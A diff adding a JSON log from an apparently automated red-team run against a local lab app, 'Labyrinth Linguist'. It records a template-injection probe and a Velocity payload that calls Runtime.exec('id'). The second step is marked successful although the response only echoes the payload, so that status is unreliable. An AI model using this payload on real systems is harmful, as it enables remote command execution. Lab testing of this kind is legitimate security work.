@@ -1,0 +1,165 @@
+{
+  "version": 1,
+  "executed": true,
+  "plan_id": "velocity-ssti-rce-via-bufferedreader",
+  "workdir": "C:\\Users\\ADMIN\\red\\redteam\\b",
+  "step_results": [
+    {
+      "step_id": 1,
+      "type": "python",
+      "purpose": "Confirm SSTI execution with a simple arithmetic probe to ensure the template engine processes directives.",
+      "result": {
+        "ok": true,
+        "exit_code": 0,
+        "stdout": "[HTTP] 200 POST / => <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for\nHTTP 200: <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for\nSTEP_OK\nSTEP_OK\n",
+        "stderr": "",
+        "duration_sec": 0.831,
+        "container_id": "b415622e29eb",
+        "execution_mode": "docker",
+        "network_mode": "docker-host-gateway",
+        "target_ip": "host-gateway",
+        "target_host": "host.docker.internal",
+        "target_port": 1337
+      },
+      "chain_output": {
+        "target_context": {
+          "base_url": "http://localhost:1337",
+          "host": "localhost",
+          "port": 1337,
+          "scheme": "http",
+          "policy_base_url": "http://localhost:1337",
+          "execution_base_url": "http://host.docker.internal:1337",
+          "execution_host": "host.docker.internal",
+          "execution_port": 1337,
+          "runtime_targets": [
+            {
+              "logical": {
+                "protocol": "http",
+                "port": 1337
+              },
+              "runtime": {
+                "host": "host.docker.internal",
+                "port": 1337
+              }
+            }
+          ],
+          "network_mode": "docker-host-gateway"
+        },
+        "_last_response_text": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-form-button\" type=\"submit\" value=\"Submit →\">\n    </form>\n    <h2 class=\"fire\">49</h2>\n</body>\n</html>\n",
+        "_last_status": 200,
+        "_stdout": "[HTTP] 200 POST / => <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for\nHTTP 200: <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for\nSTEP_OK\nSTEP_OK\n",
+        "_http_responses": [
+          {
+            "status_code": 200,
+            "method": "POST",
+            "url": "/",
+            "response_body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for"
+          }
+        ]
+      },
+      "http_responses": [
+        {
+          "status_code": 200,
+          "method": "POST",
+          "url": "/",
+          "response_body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for"
+        }
+      ],
+      "execution_results": []
+    },
+    {
+      "step_id": 2,
+      "type": "python",
+      "purpose": "Execute the 'id' command via Velocity SSTI using Runtime.exec and BufferedReader to capture output.",
+      "result": {
+        "ok": true,
+        "exit_code": 0,
+        "stdout": "[HTTP] 200 POST / => <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for\nHTTP 200: <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for\nSTEP_OK\nSTEP_OK\n",
+        "stderr": "",
+        "duration_sec": 0.823,
+        "container_id": "920def73bfd3",
+        "execution_mode": "docker",
+        "network_mode": "docker-host-gateway",
+        "target_ip": "host-gateway",
+        "target_host": "host.docker.internal",
+        "target_port": 1337
+      },
+      "chain_output": {
+        "target_context": {
+          "base_url": "http://localhost:1337",
+          "host": "localhost",
+          "port": 1337,
+          "scheme": "http",
+          "policy_base_url": "http://localhost:1337",
+          "execution_base_url": "http://host.docker.internal:1337",
+          "execution_host": "host.docker.internal",
+          "execution_port": 1337,
+          "runtime_targets": [
+            {
+              "logical": {
+                "protocol": "http",
+                "port": 1337
+              },
+              "runtime": {
+                "host": "host.docker.internal",
+                "port": 1337
+              }
+            }
+          ],
+          "network_mode": "docker-host-gateway"
+        },
+        "_last_response_text": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-form-button\" type=\"submit\" value=\"Submit →\">\n    </form>\n    <h2 class=\"fire\">#set($s='')#set($rt=$s.class.forName('java.lang.Runtime'))#set($chr=$s.class.forName('java.lang.Character'))#set($str=$s.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))#set($in=$ex.getInputStream())#set($br=$s.class.forName('java.io.BufferedReader').getConstructor($s.class.forName('java.io.Reader')).newInstance($s.class.forName('java.io.InputStreamReader').getConstructor($s.class.forName('java.io.InputStream')).newInstance($in))#set($line=$br.readLine())$line</h2>\n</body>\n</html>\n",
+        "_last_status": 200,
+        "_stdout": "[HTTP] 200 POST / => <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for\nHTTP 200: <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for\nSTEP_OK\nSTEP_OK\n",
+        "_http_responses": [
+          {
+            "status_code": 200,
+            "method": "POST",
+            "url": "/",
+            "response_body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for"
+          }
+        ]
+      },
+      "http_responses": [
+        {
+          "status_code": 200,
+          "method": "POST",
+          "url": "/",
+          "response_body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-for"
+        }
+      ],
+      "execution_results": []
+    }
+  ],
+  "chain_context": {
+    "target_context": {
+      "base_url": "http://localhost:1337",
+      "host": "localhost",
+      "port": 1337,
+      "scheme": "http",
+      "policy_base_url": "http://localhost:1337",
+      "execution_base_url": "http://host.docker.internal:1337",
+      "execution_host": "host.docker.internal",
+      "execution_port": 1337,
+      "runtime_targets": [
+        {
+          "logical": {
+            "protocol": "http",
+            "port": 1337
+          },
+          "runtime": {
+            "host": "host.docker.internal",
+            "port": 1337
+          }
+        }
+      ],
+      "network_mode": "docker-host-gateway"
+    },
+    "_last_response_text": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Labyrinth Linguist 🌐</title>\n    <link rel=\"stylesheet\" href=\"/css/style.css\">\n</head>\n<body>\n    <form class=\"fire-form\" action=\"\" method=\"post\">\n        <span class=\"fire-form-text\">Enter text to translate english to voxalith!</span><br><br>\n        <input class=\"fire-form-input\" type=\"text\" name=\"text\" value=\"\">\n        <input class=\"fire-form-button\" type=\"submit\" value=\"Submit →\">\n    </form>\n    <h2 class=\"fire\">#set($s='')#set($rt=$s.class.forName('java.lang.Runtime'))#set($chr=$s.class.forName('java.lang.Character'))#set($str=$s.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))#set($in=$ex.getInputStream())#set($br=$s.class.forName('java.io.BufferedReader').getConstructor($s.class.forName('java.io.Reader')).newInstance($s.class.forName('java.io.InputStreamReader').getConstructor($s.class.forName('java.io.InputStream')).newInstance($in))#set($line=$br.readLine())$line</h2>\n</body>\n</html>\n",
+    "_last_status": 200
+  },
+  "execution_mode": "docker",
+  "security_policy": "ENFORCED_DOCKER_ONLY",
+  "total_steps": 2,
+  "blocked_steps": 0
+}
